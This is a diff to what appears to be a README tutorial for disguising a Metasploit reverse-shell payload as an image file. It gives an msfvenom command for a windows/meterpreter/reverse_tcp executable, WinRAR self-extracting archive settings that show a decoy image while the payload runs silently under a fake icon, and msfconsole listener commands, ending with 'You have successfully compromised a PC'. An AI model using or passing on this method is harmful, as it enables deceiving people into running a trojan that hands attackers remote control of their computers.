@@ -29,7 +29,9 @@
    ```bash
    ip a
    ```  
-   Locate the IP under the active network interface (e.g., `eth0` or `wlan0`).  
+   Locate the IP under the active network interface (e.g., `eth0` or `wlan0`).
+   ![How to find IP address](https://github.com/user-attachments/assets/47e35044-d144-4555-bb6d-385b38387c41)
+
 
    **Why**:  
    The payload needs your IP to send the connection back.  
@@ -37,8 +39,8 @@
    **If not done**:  
    The payload cannot connect to your system.  
 
-2. Choose a port:  
-   Pick a port not already in use, like `4444` or `8080`.  
+3. Choose a port:  
+   Pick a port not already in use, like `4444` or `8080`. In my case I will use 192.168.163.74 as IP and 4444 as PORT
 
    **Why**:  
    Both the payload and listener must use the same port for communication.  
@@ -51,9 +53,9 @@
 ### Step 2: 🖼️ Create an `.ico` Icon File  
 
 #### 1. **Convert to `.ico`**  
-   - Using an **Online Converter**:  
-     - Upload the image to a service like [icoconvert.com](https://www.icoconvert.com/).  
-     - Download the `.ico` file.  
+   - Using an **Online Converter**:✅ RECOMENDED
+     - Upload the image to a service like [freeconvert.com](https://www.freeconvert.com/ico-converter).  
+     - Download the `.ico` file.
 
    - Using **GIMP**:  
      - Open the image.  
@@ -77,6 +79,10 @@
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f exe -o payload.exe
    ```  
    change <YOUR_IP> and <YOUR_PORT>
+   
+   ![Screenshot 2024-11-20 135204](https://github.com/user-attachments/assets/4e61ff1f-b1f6-4dee-bb2c-ba7bff6d6b38)
+
+  
 
    **Why**:  
    This creates the payload (`payload.exe`) to connect back to your listener.  
@@ -93,21 +99,25 @@
 
 #### 2. **Configure WinRAR**  
 
-**💡 Add an image here showing WinRAR's archive options.**  
-
 - **Create an SFX Archive**:  
-  - Right-click the files → Select `Add to Archive`.  
-  - In the settings, check **Create SFX archive**.  
+  - Select all the 3 files & Right-click the files → Select `Add to Archive`.
+  - In the settings, check **Create SFX archive**.
+  - ![Screenshot 2024-11-20 140511](https://github.com/user-attachments/assets/212f8121-87c9-487b-8419-64f821ee7df8)
+
 
 - **Advanced Settings**:  
   - Navigate to the **Advanced tab** → Click **SFX Options**.  
+  - ![Screenshot 2024-11-20 141016](https://github.com/user-attachments/assets/d34cf986-89d3-44b4-b80c-e256cbc22c30)
 
 #### SFX Options:  
-1. **General Tab**  
+1. **Setup Tab**  
    - Enter the following under "Run after extraction":  
      ```bash
-     start original_image.jpg && payload.exe
-     ```  
+     image.jpg
+     payload.exe
+     ```
+   - ![Screenshot 2024-11-20 140947](https://github.com/user-attachments/assets/23908794-15ce-43db-8bac-c0505693831a)
+
 
    **Why**:  
    Ensures the image opens first while the payload executes in the background.  
@@ -116,7 +126,9 @@
    Only the payload runs, which may look suspicious.  
 
 2. **Text and Icon Tab**  
-   - Select `icon.ico` under **Load SFX icon from the file**.  
+   - Select `icon.ico` under **Load SFX icon from the file**.
+   - ![Screenshot 2024-11-20 140940](https://github.com/user-attachments/assets/9a1dd537-9929-435b-8746-74acda7ebd01)
+
 
    **Why**:  
    Gives the file a legitimate appearance.  
@@ -127,7 +139,9 @@
 3. **Modes Tab**  
    - Select:  
      - **Unpack to temporary folder**  
-     - **Silent mode: Hide all**  
+     - **Silent mode: Hide all**
+   - ![Screenshot 2024-11-20 140952](https://github.com/user-attachments/assets/298d724e-8067-47fc-a27d-535bdc466a66)
+
 
    **Why**:  
    Prevents showing extraction or activity windows.  
@@ -139,7 +153,7 @@
 
 ### Step 5: 🛡️ Set Up the Listener in Metasploit  
 
-1. Open Metasploit:  
+1. Open Metasploit on Kali Linux:  
    ```bash
    msfconsole
    ```  
@@ -151,7 +165,8 @@
    set LHOST <YOUR_IP>  
    set LPORT <YOUR_PORT>  
    exploit  
-   ```  
+   ```
+   ![Screenshot 2024-11-20 143017](https://github.com/user-attachments/assets/9f3995b8-71f2-4400-941e-909bf849191f)
 
    **Why**:  
    This captures the reverse shell connection from the payload.  
@@ -163,28 +178,22 @@
 
 ### Step 6: 🧪 Test the Payload  
 
-1. Transfer the final file (e.g., `malicious_image.jpg`) to the Windows machine.  
-2. Open the file:  
+1. Transfer the final file (e.g., `vulnImage.jpg`) to the Windows machine. 
+![Screenshot 2024-11-20 143156](https://github.com/user-attachments/assets/e4f86713-d0f6-4063-89c2-74fac25df087)
+2. Open the file: 
+
    - The image displays, ensuring legitimacy.  
-   - In the background, the payload runs and connects back to your listener.  
+   - In the background, the payload runs and connects back to your listener. 
+
+🎉 Congratulation: You have successfully compromised a PC
+![Screenshot 2024-11-20 144427](https://github.com/user-attachments/assets/edade0da-4a2d-4fec-a48d-69bc816866ff)
+
 
    **Why**:  
    Verifies that the binding and payload work as expected.  
 
    **If not done**:  
    You won’t know if the attack was successful.  
-
----
-
-## 🎯 Example Images
-
-### 📌 Generating the Payload:  
-_Add an image here showing the `msfvenom` command execution._  
-
----
-
-### 📌 Configuring WinRAR SFX Options:  
-_Add an image here showing the WinRAR SFX options screen._  
 
 ---
 
